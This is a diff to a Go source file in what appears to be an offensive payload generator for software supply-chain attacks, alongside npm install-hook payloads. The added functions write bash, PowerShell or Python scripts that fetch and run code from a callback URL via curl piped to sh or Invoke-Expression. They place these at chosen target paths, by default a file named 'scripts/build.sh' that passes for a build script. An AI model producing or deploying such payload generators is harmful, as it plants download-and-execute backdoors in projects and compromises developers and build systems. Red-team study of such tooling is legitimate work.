@@ -27,6 +27,11 @@ type GeneratedPayload struct {
 	Properties  map[string]string // Additional properties
 }
 
+type GeneratedFile struct {
+	Path    string
+	Content string
+}
+
 // NPMPayload generates package.json payloads for npm install hooks.
 type NPMPayload struct {
 	Options PayloadOptions
@@ -35,6 +40,21 @@ type NPMPayload struct {
 // NewNPMPayload creates a new NPM payload generator.
 func NewNPMPayload(opts PayloadOptions) *NPMPayload {
 	return &NPMPayload{Options: opts}
+}
+
+func GenerateFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
+	switch strings.ToLower(strings.TrimSpace(tool)) {
+	case "bash", "powershell", "python":
+		return generateScriptFiles(tool, targets, callbackURL)
+	default:
+		payload := RecommendBestPayload([]Technique{{Name: tool}}, PayloadOptions{
+			CallbackURL: callbackURL,
+		})
+		if payload == nil {
+			return nil
+		}
+		return generatedPayloadFiles(payload)
+	}
 }
 
 // Generate creates npm package.json payloads.
@@ -416,4 +436,42 @@ func curlPipeShCommand(callbackURL string) string {
 
 func shellEscape(s string) string {
 	return strings.ReplaceAll(s, "'", "'\"'\"'")
+}
+
+func generateScriptFiles(tool string, targets []string, callbackURL string) []GeneratedFile {
+	var shebang, payload string
+	switch strings.ToLower(strings.TrimSpace(tool)) {
+	case "powershell":
+		shebang = "#!/usr/bin/env pwsh"
+		payload = fmt.Sprintf("Invoke-Expression (Invoke-WebRequest -Uri '%s').Content", callbackURL)
+	case "python":
+		shebang = "#!/usr/bin/env python3"
+		payload = fmt.Sprintf("import os; os.system(%q)", curlPipeShCommand(callbackURL))
+	default:
+		shebang = "#!/bin/sh"
+		payload = curlPipeShCommand(callbackURL)
+	}
+
+	content := shebang + "\n" + payload + "\n"
+
+	var files []GeneratedFile
+	for _, target := range targets {
+		files = append(files, GeneratedFile{Path: target, Content: content})
+	}
+	if len(files) == 0 {
+		files = append(files, GeneratedFile{Path: "scripts/build.sh", Content: content})
+	}
+	return files
+}
+
+func generatedPayloadFiles(payload *GeneratedPayload) []GeneratedFile {
+	files := []GeneratedFile{{Path: payload.File, Content: payload.Content}}
+
+	if extra, ok := payload.Properties["extra_file"]; ok {
+		if idx := strings.Index(extra, ":"); idx > 0 {
+			files = append(files, GeneratedFile{Path: extra[:idx], Content: extra[idx+1:]})
+		}
+	}
+
+	return files
 }
